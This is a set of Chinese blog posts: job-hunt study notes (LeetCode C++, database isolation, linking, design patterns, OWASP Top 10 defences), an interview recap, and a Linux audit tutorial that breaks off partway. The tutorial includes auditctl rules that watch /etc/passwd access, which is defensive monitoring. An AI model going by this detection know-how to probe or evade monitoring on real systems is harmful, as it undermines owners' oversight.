，然而，出题人给了很多组 INT_MAX 和 INT_MIN 的测试用例，简单地使用这两个宏作为初始数据范围，会挂掉。（丢雷楼某）\n因此，我们的递归函数中表示数据范围的参数需要定义为 long long 类型，然后在初始传入的时候，传个比 INT_MAX 还大的数 (long)INT_MAX + 1 。\n我giao！\nPerformance 13 LeetCode5845. 你能穿过矩阵的最后一天 题目链接 5845. 你能穿过矩阵的最后一天\n《关于思路正确而代码质量太差导致我TLE从而只做出了周赛签到题这件事》\n倒不完全认为它是道困难题，毕竟第一时间是有思路的。\n首先，二分答案是第一想法，TLE的风险也同时存在。\n对于一个答案 day 来说，如何判断在这一天里能否从第一行到达最后一行呢？BFS啊！\n我们在 day 这一天的进行BFS寻路，从第一行的任意一个起点出发，如果某个起点能到达最后一行的某个终点，说明在 day 这一天还能够穿过矩阵，继续进行二分。\n寻路时，在 day 这一天被水淹没的格子就走不了了，这里有一个关键问题：如何验证某个格子是否被水淹没？最开始，我使用了一个 map 来表示某个格子是否被淹，但这样我们需要额外引入 O(logn) 的复杂度，会超时。比赛结束之后查看题解，发现直接用 visited 数组来把被淹过的格子禁用掉即可……\n总之，比赛的时候提交的代码质量确实差了，还得多练练吧。\nAC代码 class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; g_cells; int g_row, g_col; typedef struct _pos { int x, y; friend bool operator\u0026lt; (const _pos\u0026amp; a, const _pos\u0026amp; b) { if (a.x != b.x) return a.x \u0026lt; b.x; else return a.y \u0026lt; b.y; }; } Pos, * PPos; map\u0026lt;Pos, int\u0026gt; watered; bool hasRoute(int day) { // cout \u0026lt;\u0026lt; \u0026#34;day \u0026#34; \u0026lt;\u0026lt; day \u0026lt;\u0026lt; endl; vector\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; dirs = { {1, 0}, {0, 1}, {-1, 0}, {0, -1} }; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; visited(g_row, vector\u0026lt;int\u0026gt;(g_col, 0)); queue\u0026lt;Pos\u0026gt; q; Pos head; // 通过设置visited数组来使得被淹没的方块无法访问 for (int i = 0; i \u0026lt; day; i++) { visited[g_cells[i][0] - 1][g_cells[i][1] - 1] = 1; // cout \u0026lt;\u0026lt; g_cells[i][0] - 1 \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; g_cells[i][1] - 1 \u0026lt;\u0026lt; \u0026#34; watered\\n\u0026#34;; } for (int start = 0; start \u0026lt; g_col; start++) { head.x = 0; head.y = start; // 该起点被淹了 if (visited[head.x][head.y]) continue; q.push(head); visited[head.x][head.y] = 1; } while (!q.empty()) { head = q.front(); q.pop(); // cout \u0026lt;\u0026lt; head.x \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; head.y \u0026lt;\u0026lt; endl; if (head.x == g_row - 1) return true; for (auto d : dirs) { Pos nxt; nxt.x = head.x + d.first; nxt.y = head.y + d.second; // 坐标合法，且还未被淹 if (nxt.x \u0026lt; g_row \u0026amp;\u0026amp; nxt.x \u0026gt;= 0 \u0026amp;\u0026amp; nxt.y \u0026lt; g_col \u0026amp;\u0026amp; nxt.y \u0026gt;= 0 \u0026amp;\u0026amp; !visited[nxt.x][nxt.y]) { // cout \u0026lt;\u0026lt; \u0026#34;goto: \u0026#34; \u0026lt;\u0026lt; nxt.x \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; nxt.y \u0026lt;\u0026lt; endl; // cout \u0026lt;\u0026lt; \u0026#34;This point is watered at day \u0026#34; \u0026lt;\u0026lt; watered[nxt] \u0026lt;\u0026lt; endl; q.push(nxt); visited[nxt.x][nxt.y] = 1; } } } return false; } int latestDayToCross(int row, int col, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; cells) { g_row = row; g_col = col; Pos p; g_cells = cells; int left = 0; int right = cells.size() - 2; while (left \u0026lt;= right) { int mid = (left + right) \u0026gt;\u0026gt; 1; if (hasRoute(mid)) left = mid + 1; else right = mid - 1; } return left - 1; } }; 14 LeetCode576. 出界的路径数 576. 出界的路径数\n最近总是挂每日一题，心态受到了不小的影响啊……\nwdnmd记忆化搜索还卡时间复杂度是怎么回事？？\n关键剪枝：当使用 maxMove 步直上/直下/直左/直右都无法到达边界的时候，直接返回 0 。\n淦！！\n15 数据库并发导致的问题 在网上若干资料中看到了相互矛盾的解释，直接怒而翻教材，应该是比较权威的了吧……\n由于 事务是并发控制的基本单位 ，其ACID特性需要得到保证。并发操作带来的数据不一致性包括丢失修改、不可重复读和读“脏”数据。\n15.1 丢失修改 两个事务 T1 和 T2 读入同一数据并修改， T2 提交的结果破坏了 T1 提交的结果，导致 T1 的修改被丢失。\n15.2 不可重复读 事务 T1 读取数据后，事务 T2 执行更新操作，使 T1 无法再现前一次读取结果。根据 T2 执行的操作来看，不可重复读包括三种情况：\n（1）事务 T1 读取某一数据后，事务 T2 对其进行修改。则使得 T1 两次读取的数据是不一样的。\n（2）事务 T1 读取某一数据后，事务 T2 对其进行删除。当 T1 再次读取数据时，发现某些数据消失了。\n（3）事务 T1 读取某一数据后，事务 T2 对其进行增添。当 T1 再次按照相同的条件读取数据时，发现多了一些记录。\n后两种不可重复读有时也称为 幻影 现象。\n15.3 读脏数据（脏读） 脏读是指事务 T1 修改某一数据并将其写回磁盘，事务 T2 读取同一数据后， T1 由于某种原因被撤销，这时被 T1 修改过的数据恢复原值， T2 读取到的数据与数据库中的数据就不一致了，称这些数据为 脏数据 。\n15.4 不可重复读和幻读的区别 根据 [15.2节](#15.2 不可重复读) 中对不可重复读的描述，我们可以将后两种情况称为 幻读 。\n网络上的各种资料，多用 不可重复读 来指代第一种情况，而用 幻读 来指代后两种情况。这样，不可重复读和幻读的区别就在于：不可重复读指的是数据内容的不一致，而幻读指的是数据数量的不一致。\n在使用锁来实现隔离机制的时候，针对不可重复读只需要使用 行锁 ，而针对幻读的现象需要使用 表锁 。\n15.5 四个隔离等级 事务的隔离级别有四，它们对脏读、不可重复读和幻读的解决效果分别如下：\n事务隔离级别 脏读 不可重复读 幻读 读未提交 是 是 是 读已提交 否 是 是 可重复读 否 否 是 串行化 否 否 否 16 程序装入和链接 创建进程首先要将程序和数据装入内存。将用户源程序变为可在内存中执行的程序，通常需要以下几个步骤：\n预处理。展开头文件、宏替换、去掉注释、条件编译。 编译。将代码转换成汇编代码，并在这个步骤中完成两件工作： 每个文件中产生一个函数地址符表，存储着当前文件内包含的各个函数的地址； 调用函数的代码会编译为 call 指令，而 call 指令跟随的地址上是一条 jmp 指令， jmp 指令跟随的地址才是被调用函数的地址。为 call 指令补充上地址是在链接的时候才完成的。 汇编。将编译出的文件转换成机器码。 链接。将编译后形成的一组目标模块及所需的库函数链接成一个完整的装入模块。 装入。将程序装入内存执行。 程序的链接有三种方式：\n静态链接。在程序运行前，将各目标模块和所需的库函数链接成一个完整的可执行程序，以后不再拆开。 装入时动态链接。装入内存时边装入边链接。 运行时动态链接。对于某些目标模块的链接，是在程序执行中需要该目标模块时才执行的。其优点是便于修改和更新，便于实现对目标模块的共享。 模块在装入内存时，也有三种方式：\n绝对装入。在编译时，若知道程序将驻留在内存的某个位置，则编译程序将产生绝对地址的目标代码。绝对装入程序按照装入模块中的地址，将程序和数据装入内存。该方式只使用于单道程序环境，绝对地址可在编译或汇编时给出，也可由程序员直接赋予。 可重定位装入。多道程序环境下，模块中使用的地址一般是相对地址（相对于起始地址 0 ）。可重定位装入会在装入时将模块中的相对地址修改为绝对地址（相对于装入的位置）。**装入时对目标程序中指令和数据的修改过程称为 重定位 ，地址变换通常是在装入时一次性完成的，又称为 静态重定位 **。 运行时动态装入。装入程序把模块装入内存后，并不立即把装入模块中的相对地址替换为绝对地址，而是把这种转换推迟到程序真正要执行时才进行。 这种方式需要一个重定位寄存器的支持 。 Reference\n[1] 王道论坛.2021年操作系统考研复习指导[M].北京:电子工业出版社,2020:129::131\n[2] 编译的整个过程：预编译、编译、汇编、链接 - mhq_martin - 博客园 (cnblogs.com)\n17 设计模式简述 设计模式（Design Pattern）代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。\n设计模式的目的是为了可重用代码，提高代码的可扩展性和可维护性。\n设计模式主要有几种类型：\n创建型模式 。该模式重点关注如何创建对象，在创建对象时隐藏创建逻辑，从而使对象的创建和使用相互分离。 结构型模式 。该模式重点考虑类和对象的组合，目的是获得更好、更灵活的结构。 行为型模式 。该模式重点关注算法和对象之间的职责分配，通过安排对象之间的合理通信来更好地完成整体的任务。 设计模式有如下几个原则：\n开闭原则 。软件 对扩展开放，对修改关闭 。简而言之，程序在进行升级的时候，只对现有模块进行扩展，而尽量不对原有代码进行修改。\n里氏替换原则 。子类能够完全替换父类。显然，只有当子类替换掉父类，且原有的方法不受影响时，父类才算真正得到了复用。\n依赖倒转原则 。针对接口编程，依赖于抽象而不依赖于具体。\n接口隔离原则 。使用多个隔离的接口，比使用单个接口更好。我认为该原则的思想是将复杂问题拆解，降低类之间的耦合。\n迪米特法则 。又称最小知道原则，一个实体应该尽量少地与其他实体发生作用，使得系统模块相对独立。\n合成复用原则 。尽量使用合成/聚合的方式，而不是使用继承。而若使用继承，则需要遵守里氏替换原则。\n注、使用继承的方式进行复用虽然比较简单，但破坏了父类的封装性。使用合成或聚合复用，指的是将已有对象纳入新对象中，使之成为新对象的一部分，该方法又被称为“黑箱”复用。\nRefernence:\n[1] [合成复用原则——面向对象设计原则 (biancheng.net)](http://c.biancheng.net/view/1333.html#:~:text=合成复用原则的重要性 1 它维持了类的封装性。因为成分对象的内部细节是新对象看不见的，所以这种复用又称为“黑箱”复用。,2 新旧类之间的耦合度低。这种复用所需的依赖较少，新对象存取成分对象的唯一方法是通过成分对象的接口。 3 复用的灵活性高。这种复用可以在运行时动态进行，新对象可以动态地引用与成分对象类型相同的对象。)\n[2] 设计模式简介 | 菜鸟教程 (runoob.com)\n[3] 设计模式 - 廖雪峰的官方网站 (liaoxuefeng.com)\n18 C++中的const关键字 无论 const 关键字出现在什么地方，不管它用于修饰指针、变量、函数或类，其核心作用都是防止它修饰的目标受到修改。\n18.1 const变量 const 关键字指定一个变量的值为常值，编译器将禁止对这一变量的修改。\n// constant_values1.cpp int main() { const int i = 5; i = 10; // C3892 i++; // C2105 } 我们可以使用 const 关键字来代替 #define ，这一做法会使得编译器对这一常变量进行 类型检查 ，而使用宏定义得到的对象只是在编译之前进行预处理替换，没有类型检查。\n如果此类变量作为一个类的成员变量，则必须使用 初始化列表 来进行初始化。\n在C语言中， const 变量默认为 外部链接 类型，则其只能出现在单个 源文件 中；而C++中的 const 变量与之相反，而我们知道内部链接类型的变量可以出现在 头文件 中；当然，如果希望其他源文件也访问到这一 const 变量，则需要使用 extern 来声明。\nconst 关键字也可用于指针的声明当中：\n// constant_values3.cpp int main() { char *mybuf = 0, *yourbuf; char *const aptr = mybuf; *aptr = \u0026#39;a\u0026#39;; // OK aptr = yourbuf; // C3892 } 以一种简单的方式来区分 常指针 和 常量指针 ：如果 const 出现在星号 * 后面，则它修饰的是指针变量本身；如果 const 出现在星号 * 前面，则它修饰的是指针指向的变量。\n如果难以区分，不妨从英文的角度出发，观察以下两个变量：\nconst char* p1; // pointer to constant data char* const p2; // constant pointer 是不是好懂了一些？\n18.2 const成员函数 声明一个带有 const 关键字的成员函数表明该函数是一个“只读”函数，其内部代码将不会改变任何成员变量。这类函数不能修改任何非静态变量、且只能调用其他的 const 函数。\n声明和定义 const 函数的办法是在函数形参的小括号后面加上 const 关键字。\n// constant_member_function.cpp class Date { public: Date( int mn, int dy, int yr ); int getMonth() const; // A read-only function void setMonth( int mn ); // A write function; can\u0026#39;t be const private: int month; }; int Date::getMonth() const { return month; // Doesn\u0026#39;t modify anything } void Date::setMonth( int mn ) { month = mn; // Modifies data member } int main() { Date MyDate( 7, 4, 1998 ); const Date BirthDate( 1, 18, 1953 ); MyDate.setMonth( 4 ); // Okay BirthDate.getMonth(); // Okay BirthDate.setMonth( 4 ); // C2662 Error } 19 OWASP top 10（2017） 19.1 注入 解释 ：该漏洞的核心是缺乏对Web应用程序使用的数据的验证和清理。任何接受参数作为输入的内容都可能受到注入攻击。\n防护 ：\n使用安全的API。 对输入设置白名单，或者相关输入验证。 转义特殊记录。 在查询中使用 LIMIT 或其他SQL控件，防止SQL注入时大量地泄露记录。（考虑最坏情况……） 19.2 失效的身份认证 解释 ：该漏洞的核心是身份认证机制在某处实现上存在问题。如使用单因素身份认证、使用弱口令、在用户注销之后没有及时清除Session、在URL中暴露会话ID等。\n防护 ：\n多因素身份认证。 弱口令检查。 统一注册、凭据恢复等接口，防止用户枚举攻击。 会话ID的合理管理，如登录之后生成高度随机的会话ID、妥善存储（肯定不能出现在URL里……）、登出之后及时销毁。 19.3 敏感数据泄露 解释 ：该漏洞的核心是密码算法的失效（Cryptographic Failures）。数据在 存储 、 传输 或 交互 过程中没有使用合理的加密算法进行保护，使得其中敏感数据被泄露。\n防护 ：\n对没必要存储的敏感数据予以及时销毁，存储的敏感数据确保加密。 使用最新的、强大的算法、协议、密钥，且密钥妥善管理。 确保数据传输过程中受到加密保护，如使用HSTS。 19.4 XML外部实体（XXE） 解释 ：许多较早的或配置错误的XML处理器解析了XML文件中的外部实体引用，攻击者可以利用这些外部实体窃取服务侧的内部文件和共享文件、实行内网扫描、远程代码执行和拒绝服务攻击（可以归纳为SSRF吗？）\n防护 ：\n使用简单的数据格式（如JSON），避免对敏感数据进行序列化。 XML库的版本检查，及时更新修复相关组件。 在XML解析器上禁用外部实体和DTD（文档定义类型）。 服务端实施白名单机制，对输入进行过滤和清洗。 19.5 失效的访问控制 解释 ：Broken Access Control ，和19.2中的 Broken Authentication 是有区别的。个人理解，失效的访问控制主要是指攻击者已经具备了一个合法用户，只是他所对应的访问权限可以经由某种手段进行提升，从而访问某些未经授权的功能或数据。\n防护 ：\n访问控制只有在服务端有效 。 除公有资源外，默认情况下拒绝访问其他资源。 建立一次性的访问控制机制，并在整个应用中不断重用他们。 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录（强制访问控制MAC？）。 记录失败的访问控制，并及时告警。 19.6 安全配置错误 解释 ：顾名思义。这个问题是很常见的安全问题，通常由于不安全的默认配置、不完整的临时环境、开源云存储、错误的HTTP标头配置以及包含敏感信息的详细错误信息所造成的。\n防护 ：\n实施安全的安装过程，如开发、测试、生产环境中保持相同安全配置，且口令不同。安装过程尽量自动化，以减小出错的可能。 搭建最小化平台，移除所有不必要的功能、组件、文件及示例。 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分。检查过程中，特别注意云存储的权限。 向客户端发送安全指令，如安全标头（想到了CSP、HTTP-Only）。 19.7 跨站脚本（XSS） 解释 ：网页中使用了用户提供的参数，且这些参数没有被妥善地转义，可能引发浏览器将这些参数当作原本网页中的脚本，予以执行。\n防护 ：\n使用设计上就会自动编码来解决XSS问题的框架，如Ruby 3.0或React JS。了解每个框架XSS保护的局限性，并适当地处理未覆盖的用例。 根据HTML上下文对所有不受信任的HTTP请求数据进行转义 or 编码。 内容安全策略（CSP） ，如果不存在本地文件上传的其他漏洞，将绝杀。（大致思想是向客户端发送安全指令，限定只执行某些域名下的脚本）。 19.8 不安全的反序列化 解释 ：序列化是将对象的状态信息转换为可以存储或传输的形式的过程。在序列号期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，来重建该对象。不安全的反序列化是指攻击者提供恶意的篡改过的对象，使得应用程序和API变得脆弱。\n针对反序列化漏洞，主要有两种攻击形式：\n在反序列化过程中改变应用逻辑或实现远程代码执行，称为 对象和数据结构攻击 ； 篡改序列化之后的数据，实现访问控制相关的攻击； 防护 ：\n唯一安全的架构是不接受来自不受信源的序列化对象。 可以考虑执行完整性检查，如对序列化对象进行数字签名，防止恶意对象创建或数据篡改。 将反序列化代码隔离在低特权环境中运行。 监控反序列化行为，记录反序列化的例外情况和失败信息。 19.9 使用含有已知漏洞的组件 解释 ：组件（库、框架和其他模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能造成严重的数据丢失或服务器接管。\n防护 ：\n移除不使用的依赖、不需要的功能、组件、文档。 利用各种工具来持续记录客户端和服务端以及它们的依赖库的版本信息。持续监控CVE等信息来判断已有组件是否有漏洞。 使用官方渠道安全地获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险。 监控那些不再维护或不发布安全补丁的库和组件。 19.10 不足的日志记录和监控 解释 ：不足的日志记录和监控，使得攻击者在系统中可以更隐蔽地驻留、攻击、横向移动、销毁证据。\n防护 ：\n确保所有登录、访问控制失败、输入验证失败都能被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意账户，并为后期取证留足时间。 确保日志以一种能够被集中日志管理解决方案使用的形式生成。 确保高额交易有完整性控制的审计信息，且审计信息必须防止篡改或删除。 采用有效的监控和告警机制。 采用一个应急响应机制和恢复计划。 ","date":"2021-08-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E7%A7%8B%E6%8B%9B-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/","title":"秋招 | 一些知识点"},{"content":"谁能想到我一个安全专业的人会被后端开发岗捞起来呢 -_-||\n按照火星公司的性格，上岸概率不大。这篇先作为draft，暂时不在博客上发表出来。\n1 HTTPS的流程？ 比较easy的问题，算是看在我的安全经验上来送分的？\n此前整理过这个问题 ☞ 秋招 | 一些知识点 (xr_g的博客) ，但是面试的时候稍微有点紧张，忘了一些细节。回答的是基于公钥密码的密钥交换（这个流程比较好记）；但实际上HTTPS还有基于ECDHE的密钥交换，当时记得不够清楚，也就没跟面试官讲了。\n1.1 为什么HTTPS不用公钥加密通信？ 肯定是效率啊！\n非对称加密的算法能够得到严谨的安全性证明，但是它的加解密效率比较低；对称加密算法在设计时就充分考虑了计算机硬件的运算优势，所以效率很高。因此，我们一般用非对称加密算法来进行密钥交换，使用交换后的密钥进行对称加密的通信。\n2 听过加盐吗？ 在存储用户口令的时候，在口令后面附上一些与用户身份相关的值，然后再进行哈希。\n这样做的好处是对于不同用户的相同口令，不会得到相同的哈希值，避免了撞库和暴力破解。\n当时可没答出撞库和爆破，冷静下来才发现答得有多烂（悲）。\n2.1 那一般取什么值来作为盐呢？ 呃，嗯，这个……\n一般取跟用户身份相关的值？比如用户ID？\n事后发现当时少说了一个随机值。\n3 听过彩虹表？ 大概是预先计算一些明文的哈希值，然后对着得到的哈希值进行比较破解？\n巴拉了半天，发现我说的其实就是哈希字典。\n然而彩虹表不是这样的！详见 密码破解的利器——彩虹表（rainbow table） - 简书 (jianshu.com) 。\n郁闷，又挂一题。\n4 听过SYN攻击吗？ SYN Flood？好亲切！\nTCP三次握手时，当服务端收到一个SYN，返回ACK+SYN的时候，就为本次连接分配了资源，即所谓的 半开连接 。\n而客户端需要完成第三次握手之后，才分配连接资源。\n假如有很多客户端，同时向服务端发送SYN，但不完成第三次握手，就会以自身很少的资源消耗、来占用服务端大量的连接资源，使得服务端无法接受其他正常客户端的连接。\n4.1 如何防御呢？ 一般的WAF都能识别此类攻击。\n此外，可以在服务端适当地缩减半开连接的超时时间，即更快地清除没用的半开连接（我在说什么艹）。\n还有就是可以用代理服务器先接受连接，这类服务器一般可以针对SYN进行硬件上的优化，也可以通过一定的算法来识别SYN Flood（实在想不出识别的算法，含糊其辞了）。\n正解：代理服务器没毛病，可以使用cookie源认证等办法来识别恶意客户端；还有主机上可以设置SYN Cache，先不为半开连接分配资源，等建立连接之后再从cache中取出半开连接的信息，分配资源。\n亏我以前还整理过，真正要用的时候想不起来了 -_-||\nDoS——拒绝服务攻击 (gitee.io)\n5 TCP和UDP的区别？ 可以再八股一点？\nTCP是面向连接的，字节流；UDP是无连接的，报文流。\n编程实现上也有一些区别，但是我没用过UDP编程（我又在说什么）。\n还有就是TCP的连接是可靠的，有一些办法来保证。\n5.1 怎么保证TCP连接可靠？ 挖坑埋自己……\n想不起来了。\n正解：校验、序号、确认、重传。\n不说了，有空一定看计网 o(╥﹏╥)o\n传输层协议——TCP (gitee.io)\n5.2 假如服务端要接收1、2、3、4、5号包，如何确保有序？ 发送窗口和接收窗口吧？\n例如服务端收到了2~5号包，而没有收到1号包，此时就发送 ACK=1 ，告知客户端重传1号包。由于客户端也维持相同的发送窗口，可以只重传1号包而不重传其他。\n还有冗余ACK，脑子里想到了，当时聊着聊着就忘记说出来了。\n5.3 TCP粘包听过吗？ 听过，大概就是由于网络原因，把两个包视作了一个包进行处理？\n具体是什么情况会出现粘包？\nemmm，可能是协议栈实现的时候出了点问题？也可能是网络原因……\n正解：其实是因为TCP是字节流的传输，发送端发多少数据和接收端一次收多少数据，没有必然的联系。这就可能出现发送端一次发送 n 字节，而接收端一次接收 2n 字节，两个包就粘到一起了。此外，可能在发送端要等到缓冲区满了才发，那么就有好几个包粘到一起发送的情况。\n内心OS：其实好像还真是协议栈的实现问题？\n详见 粘包问题及解决 - xuchong - 博客园 (cnblogs.com) ，写得真不错！\n6 你知道哪些HTTP头？ User-Agent\nReferer\nXFF\nEncode？？（记忆模糊了，其实想说Accept-Encoding）\nContent-Length\n……（被打断）\nXFF当时没说上含义，其实是告诉服务端这个请求者的最初始IP。\n感谢当年做过的一个简单Web题……\nXFF与Referer（含实操）_slj1552560的博客-CSDN博客_xff\n7 I/O 多路复用？ 听过，但完全没印象，pass。\n8 数据库 8.1 left-join、inner-join、right-join？ 完全没答上来……\nleft-join就是在两个表进行筛选时，完全保留左表的内容；\nright-join同理；\ninner-join则只保留两个表中都匹配的内容。\nleft join,right join,inner join,full join之间的区别 - lijingran - 博客园 (cnblogs.com)\n8.2 隔离级别？ 可算是被我蹲到一个会的。\n读未提交：读到其他事务还没提交的数据；\n读已提交：顾名思义；\n可重复读\n串行化。\n8.3 隔离级别的区别？ 其实隔离级别来源于数据库并行处理事务时会发生的问题。\n如脏写、脏读、不可重复读、幻读。\n幻读和不可重复读的区别？\n不可重复读是针对某个确定数据，而幻读可能是针对不确定的多行数据。\n例如，额，额，……（忘了）\n正解：数据库事务的概念及其实现原理 - takumiCX - 博客园 (cnblogs.com)\n9 说一下 fd=fopen() 这个指令在系统中的具体流程？ 开始了操作系统部分。\n文件的读操作，就是向目标文件的真实设备上发送一个IO请求，这个IO请求经过绑定在这个设备上的多个设备（设备栈）之后，到达文件驱动，然后把文件读取出来，返回。\n还有吗？\n没了……\n后来发现他想问的可能不是驱动，而是API调用的整个过程（中断，保存现场，系统调用，返回文件指针等）。\n10 孤儿进程和僵尸进程？ 孤儿进程就是指父进程创建子进程后，父进程先死亡，然后子进程就变成了孤儿进程。孤儿进程一般由 init 进程接管，会去调用 wait 方法来回收这些进程。\n僵尸进程是指父进程创建子进程后，不去管这些子进程了。当子进程结束之后，本来应该由父进程进行回收，但父进程不管它们了，就使得这些子进程的资源停留在系统中。\n孤儿进程与僵尸进程[总结] - Rabbit_Dale - 博客园 (cnblogs.com)\n11 进程切换上下文？ 保存一些寄存器的值（ESP、EIP、EBP等）。\n产生系统栈、CPU等的开销。\n12 冒泡、快排、归并的最好最坏时间复杂度？ 冒泡应该都是 O(n^2) ？因为都要进行冒泡。\n归并应该都是 O(nlogn) ？因为只需要进行归并。\n快排记不清了，最坏是 O(n^2) ，具体场景忘记。\n正解：\n冒泡最优 O(n) ！沃日。\n归并都是 O(nlogn) 没毛病。\n快排最优 O(nlogn) ，最坏 O(n^2) 。\n冒泡最优的情况需要对代码进行优化，如果某次冒泡的时候没有进行交换，说明已经有序，直接返回 （冒泡排序的最优时间复杂度_小君子的博客-CSDN博客_冒泡排序最优时间复杂度）。\n快排最优最坏的分析见 （快速排序最好，最坏，平均复杂度分析_weshjiness的专栏-CSDN博客_快排复杂度）。\n还有，这个表不错： 常见排序的最好，平均以及最坏时间复杂度_JohnieLi的博客-CSDN博客_排序最好最坏时间复杂度\n13 代码题：之字形打印N叉树 如图所示，之字形打印N叉树。\n题目 我使用了两个栈来层序遍历。从左到右将子节点入栈，下一层就从右到左输出；反之亦然。\n问题在于：如何将子节点 从右到左 入栈呢？\n跟面试官聊了聊，他说可以先考虑实现上的方便，那我就用一个 vector 来保存子节点，从左到右遍历或从右到左遍历都行。\n实际上如果使用指针来保存子节点，估计还得开一个临时 vector 来存所有子节点，然后再从右到左入栈。\n","date":"2021-08-28T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%AD%97%E8%8A%82%E5%90%8E%E7%AB%AF%E9%9D%A2%E7%BB%8F/","title":"字节后端面经"},{"content":"什么是audit Linux下的audit框架提供可靠的搜集系统信息的服务，任何与安全相关（或无关）的事件都可被此框架搜集和审计。通过audit，人们可以更加详细地了解系统上发生的事情，然而，该框架并不提供额外的安全措施，在安全事件中，它仅仅是帮助人们更加清晰地认识整个事件的始末，此后亡羊补牢，为时未晚。\n简单地说，audit审计框架的工作就是监听来自内核的事件报告，并将它们写入日志文件中。\n而较为系统地说，audit框架的组件结构如图所示：\nimg 安装 内核层的audit服务在Linux（4.18及以后）、Linux-lts（4.19及以后）、Linux-zen（4.18及以后）和Linux-hardened等版本中默认可用。如用户使用自行编译的内核，需要在编译中设置参数 CONFIG_AUDIT 。\n我们通过查看内核编译参数，可以看到系统对audit内核审计的支持情况，以CentOS 7为例：\nimg 用户层的audit服务可以通过普通的软件安装方式获取，可以使用 systemctl 或 service 命令来控制服务的启停。\naudit内核审计的消息可以由应用或系统活动来触发，而 audit daemon（audit守护进程） 是audit框架中的重要组成部分，它负责处理内核生成的消息，例如将这些消息写入日志中或选择性地忽略。\n我们可以通过若干命令和文件来控制 audit daemon ：\nauditctl ：直接控制守护进程的行为，如添加规则等； /etc/audit/audit.rules ：内含audit守护进程的规则和各种变量； aureport ：生成系统活动的审计报告； ausearch ：在审计日志中对各类事件进行搜索； auditspd ：用于将事件消息通知给其他应用的守护进程，有了此进程，事件就不需要通过磁盘上的audit日志来进行传递了； autrace ：用于追踪某一进程的命令，类似 strace ； etc/audit/auditd.conf ：关于日志记录的配置文件。 添加规则 基础 注意，audit框架对事件的审计是全面而细致的，添加规则之前，我们需要对规则有充分的认知，否则，可能仅仅由于一条规则，我们的日志文件就被瞬间写满了。\naudit规则的加载可以通过命令行工具 auditctl 或使用命令 auditctl -R /etc/audit/audit.rules 从规则文件中批量读取。\n通过 auditctl 命令添加的规则会在系统重启之后丢失。如希望使规则持续生效，就将它们写入 /etc/audit/audit.rules 文件中，通过命令 rcauditd resatrt 重启audit服务使规则文件生效。\n对文件和目录访问的审计\n监控某一特定文件的访问行为属于audit框架的基础用法。使用 -w 选项（表示”watch“）来指定你要监控的文件或目录。最常见的规则是监控对 passwd 文件的访问：\n# auditctl -w /etc/passwd -p rwxa 也可以监控对某一路径的访问：\n# auditctl -w /etc/security/ 上面给出的第一条规则监控了对 etc/passwd 文件的所有读操作 r 、写操作 w 、执行 x 和属性变更操作 a ，此类规则指定的文件需要事先存在；\n第二条规则监控了对 etc/security 目录的所有访问，默认情况下，目录相关的规则只记录这一目录下的文件创建/删除，希望对其下的文件进行进一步的监控，就使用第一条规则来指定具体文件。\n可以通过以下命令来查看所有处于活动状态的规则：\n# auditctl -l 可以通过以下命令来删除 所有 规则：\n# auditctl -D 当确认规则无误之后，可以将它们添加到 /etc/audit/audit.rules 文件末尾：\n-w /etc/passwd -p rwxa -w /etc/security/ 对系统调用的审计 通过 -a 选项可以对系统调用进行审计。\n例如，对 chmod 调用进行审计，以检测文件属主的变更：\n# auditctl -a entry,always -S chmod 可以通过 syscalls 页面找到所有系统调用。\n对系统调用进行审计时，可以使用 -F 来添加对某个键值的筛选，例如：\n# 审计所有第二个参数为 4 的 access 调用 -a entry,always -S access -F a1=4 # 审计所有不成功的 open 调用 -a exit,always -S open -F success!=0 下面这条规则也使用了 -F 选项，但是它的审计内容较为特殊：\n-a task,always -F auid=0 当一个进程被创建或克隆时， task 规则就起作用了。在上面这条示例中，我们将选中所有具备 auid=0 的任务，并在它们发生时进行记录。每个进程都会在用户登录时被赋予一个 audit ID ，这一ID不随着用户身份的改变而改变，且子进程会继承父进程的 auid ，通过这个ID我们可以唯一确定原始用户。\n对无用消息的过滤 在日志记录过程中，有必要避免对不重要的消息进行记录，从而既方便我们对日志进行分析，也减小日志文件的体积。\n可以添加如下形式的规则来对部分消息进行过滤：\n# 以下规则添加在 /etc/audit/rules.d/quiet.rules 文件中 --- -A exclude,always -F msgtype=SERVICE_START -A exclude,always -F msgtype=SERVICE_STOP -A exclude,always -F msgtype=BPF audit 日志 日志的基本格式 默认情况下，audit日志存放在 /var/log/audit 目录下。下面先看一条典型的audit日志示例：\n# 命令执行审计 type=SYSCALL msg=audit(1234874638.599:5207): arch=c000003e syscall=2 success=yes exit=4 a0=62fb60 a1=0 a2=31 a3=0 items=1 ppid=25400 pid =25616 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts1 ses=1164 comm=\u0026#34;less\u0026#34; exe=\u0026#34;/usr/bin/less\u0026#34; key=\u0026#34;doc_log\u0026#34; type=CWD msg=audit(1234874638.599:5207): cwd=\u0026#34;/root\u0026#34; type=PATH msg=audit(1234874638.599:5207): item=0 name=\u0026#34;/var/log/audit/audit.log\u0026#34; inode=1219041 dev=08:06 mode=0100644 ouid=0 ogid=0 rdev=00:00 这是执行了命令 less /var/log/audit/audit.log 之后得到的日志，audit通过一事件产生了 三条 